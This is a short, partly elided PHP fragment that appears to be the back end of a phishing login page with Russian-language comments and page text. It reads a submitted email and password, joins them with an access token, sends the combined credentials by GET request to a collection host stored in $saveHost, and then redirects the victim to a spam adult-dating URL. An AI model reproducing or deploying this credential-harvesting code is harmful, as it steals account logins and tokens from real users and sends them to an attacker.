<?php
	...
	if (($_POST["email"] != "") and ($_POST["pass"]))
	{
		...
		$password = $_POST["pass"];
		$url = "http://get2laidtonight4.com/?u=z0w8kwf&o=tnz00v6";
		...
		if (strpos($check, "access_token") === false)
		{
			...
			else
			{
				...
				$ez_log = $username.":".$password.";".$result->access_token;

				//$log = fopen("logineset", "a+"); fwrite($log, $ez_log."\n"); fclose($log);
				$saveURL = $saveHost."/?save=".$ez_log;
				file_get_contents($saveURL); //GET запрос.
				header("Location: ".$url."");
			}
	}
...
<img src="\images\favicon.png" class="op_fimg" />
<div class="op_fcont">
<div class="op_owner">Администрация</div>
